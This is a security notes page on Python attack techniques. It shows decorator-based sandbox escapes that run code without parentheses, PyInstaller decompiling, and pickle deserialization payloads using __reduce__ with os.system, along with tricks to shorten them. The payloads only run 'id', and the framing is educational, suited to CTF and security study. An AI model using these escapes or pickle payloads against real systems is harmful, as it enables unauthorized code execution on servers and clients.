---
description: Some tricks specific to the Python language
---

# Python

## Filter Bypass

If you find yourself in some sandbox, jail, or otherwise restricted environment there are a lot of tricks to get out of it.&#x20;

### RCE without parentheses

Using decorators and defined lambda functions, you can execute any code without using `(` or `)` characters. Simply the act of defining this class will execute that code in the string:

```python
code = lambda x: "import os; os.system\x28'id'\x29"

@print
@exec
@code
class a:
    pass
```

Past Python 3.9, you can even get the same code as short as this:

```python
@eval
@'__import__\x28"os"\x29.system\x28"id"\x29'.format
class _:pass
```

{% hint style="info" %}
**Note**: In the string, you can encode any other characters it doesn't accept by using `\x` hex escapes
{% endhint %}

## PyInstaller Reversing

[PyInstaller](https://pyinstaller.org/en/stable/) can create executable and shareable files from Python scripts, like Windows `.exe` files or Linux ELF files. It can also be used for malware where an attacker creates a malicious Python script and compiles it to an executable they can plant somewhere with PyInstaller. That is why Reversing such a file can be very useful, and it turns out the full source code can almost flawlessly be decompiled from such a file.&#x20;

First, you will want to extract the data from the PyInstaller executable. This can be done very easily using pyinstxtractor.&#x20;

{% embed url="https://github.com/extremecoders-re/pyinstxtractor" %}
A tool to extract contents of a PyInstaller executable
{% endembed %}

As the above repository shows in the [example](https://github.com/extremecoders-re/pyinstxtractor#example), the script generates a `[name]_extracted` folder with `.pyc` files. Among these files will be all the modules, and the main script. You will often have to guess what file is the main script, but the tool will also give "Possible entry points".&#x20;

These `.pyc` files are the compiled Python bytecode, which is not human-readable. For that, we can use [uncompyle6](https://github.com/rocky/python-uncompyle6/) to decompile this bytecode into close to the original source code.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ python3 pyinstxtractor.py example.exe
</strong>[+] Processing dist\example.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 36
[+] Length of package: 5612452 bytes
[+] Found 59 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: example.pyc
[+] Found 133 files in PYZ archive
[+] Successfully extracted pyinstaller archive: dist\example.exe

<strong>$ uncompyle6 example.exe_extracted\example.pyc > example.py
</strong></code></pre>

Then you can look at the created `.py` file to review all the source code.&#x20;

## Pickle Deserialization

[Pickle](https://docs.python.org/3/library/pickle.html) is a Python module used for serializing Python objects into raw bytes. This way they can be sent over the network, or saved in a file, and then later be deserialized to get back the original Python object.&#x20;

There is one issue, however, when this deserialized data can come from the user, they can create arbitrary Python objects. This results in a classic Insecure Deserialization vulnerability, leading to Remote Code Execution.&#x20;

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>A warning from the official documentation explaining the danger of this module</p></figcaption></figure>

{% hint style="info" %}
This vulnerability has a special place in my heart, as I found it as an unintentional bug on a school assignment, and spent a lot of time and effort to try and get the most out of it. In the end, it resulted in RCE on the server, as well as on all clients that connected because the template script given was also vulnerable. You can read the whole story and learn a lot about pickle deserialization here:

{% embed url="https://jorianwoltjer.com/blog/post/hacking/getting-rce-on-a-brute-forcing-assignment" %}
Getting RCE with pickle, in **under 40 bytes** per packet, and taking over the server to also exploit clients
{% endembed %}
{% endhint %}

The basics are that you can create a Python object that executes a **system command** when pickle turns it into an object. This is done with the special `__reduce__()` method:

```python
import pickle

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ("id",))
        
rce = RCE()
data = pickle.dumps(rce)
print(data) # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
```

This method is called when the object is deserialized, and its return value will be what it turns into. But this return value is actually a function that will be called with the arguments provided. We can provide the function `os.system` after importing it, and as the first argument give it any command we want to run.&#x20;

This is often enough, but in rare cases, you might have some restrictions on what data you can send. Maybe you need to bypass some filter or a length restriction.&#x20;

### Different Protocols

Pickle has evolved over time, with new protocols for better serializing of objects. Luckily, this protocol can be chosen by whoever creates the data, and the server deserializing it will simply recognize the protocol and switch accordingly.&#x20;

This opens up the opportunity for a few different formats that might help in whatever filter you are trying to get through.&#x20;

Using the `pickletools.dis(data)` function, we can disassemble the serialized data to better understand what each byte is doing:

```python
    0: \x80 PROTO      4
    2: \x95 FRAME      29
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'id'
   34: \x94 MEMOIZE    (as 3)
   35: \x85 TUPLE1
   36: \x94 MEMOIZE    (as 4)
   37: R    REDUCE
   38: \x94 MEMOIZE    (as 5)
   39: .    STOP
```

This `PROTO` value represents the protocol used, and in the `pickle.dumps` method we can simply specify `protocol=` keyword argument to specify the protocol. This is a number between 0 and 5. Looking at all of these protocols the payload can get very different:

```python
protocol=0                         protocol=1 (shortest)               protocol=2                          protocol=3                          protocol=4 (default)
 0: c  GLOBAL   'posix system'      0: c  GLOBAL   'posix system'       0: \x80 PROTO    2                  0: \x80 PROTO    3                  0: \x80 PROTO    5
14: p  PUT      0                  14: q  BINPUT   0                    2: c    GLOBAL   'posix system'     2: c    GLOBAL   'posix system'     2: \x95 FRAME    29
17: (  MARK                        16: (  MARK                         16: q    BINPUT   0                 16: q    BINPUT   0                 11: \x8c SHORT_BINUNICODE 'posix'
18: V    UNICODE  'id'             17: X    BINUNICODE 'id'            18: X    BINUNICODE 'id'            18: X    BINUNICODE 'id'            18: \x94 MEMOIZE  (as 0)
22: p    PUT      1                24: q    BINPUT     1               25: q    BINPUT  1                  25: q    BINPUT   1                 19: \x8c SHORT_BINUNICODE 'system'
25: t    TUPLE    (MARK at 17)     26: t    TUPLE      (MARK at 16)    27: \x85 TUPLE1                     27: \x85 TUPLE1                     27: \x94 MEMOIZE  (as 1)
26: p  PUT      2                  27: q  BINPUT   2                   28: q    BINPUT  2                  28: q    BINPUT   2                 28: \x93 STACK_GLOBAL
29: R  REDUCE                      29: R  REDUCE                       30: R    REDUCE                     30: R    REDUCE                     29: \x94 MEMOIZE  (as 2)
30: p  PUT      3                  30: q  BINPUT   3                   31: q    BINPUT  3                  31: q    BINPUT   3                 30: \x8c SHORT_BINUNICODE 'id'
33: .  STOP                        32: .  STOP                         33: .    STOP                       33: .    STOP                       34: \x94 MEMOIZE  (as 3)
len(data)=34                       len(data)=33                        len(data)=34                        len(data)=34                        35: \x85 TUPLE1
                                                                                                                                               36: \x94 MEMOIZE    (as 4)
                                                                                                                                               37: R    REDUCE
                                                                                                                                               38: \x94 MEMOIZE    (as 5)
                                                                                                                                               39: .    STOP
                                                                                                                                               len(data)=40
```

I found in most simple cases, `protocol=1` is the shortest.&#x20;

### Replacing strings

As you might have noticed above, the `os.system` function turned into `'posix system'` for the serialized data. This is what automatically happens when you serialize data using `pickle.dumps`, but it turns out there are actually multiple ways to represent this function.&#x20;

I expected to see `os` instead of `posix`, so I tried simply replacing `posix` with `os`. This turned out to actually work! The deserializer will happily decode this to the correct function and still achieves RCE. By simply replacing this text in the serialized data, you can get rid of 3 characters:

```python
rce = RCE()
data = pickle.dumps(rce)
data = data.replace(b"posix", b"os")
print(data)  # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
```

### Short commands

Finally, after having the shortest possible pickle data, you need a short command to receive a shell and further explore the target. In the writeup linked above, I discover my own method to slowly write a full payload to a file and execute it in a lot of commands below 12 bytes. This was enough to bypass the 40-byte packet limit that the situation had.&#x20;

However, in the meantime, I found that this problem has been explored before. Orange Tsai made a challenge where you had to achieve full RCE commands of only 4 bytes each. The solution to this challenge is explained in [#rce-in-4-bytes](../linux/hacking-linux-boxes.md#rce-in-4-bytes "mention").&#x20;
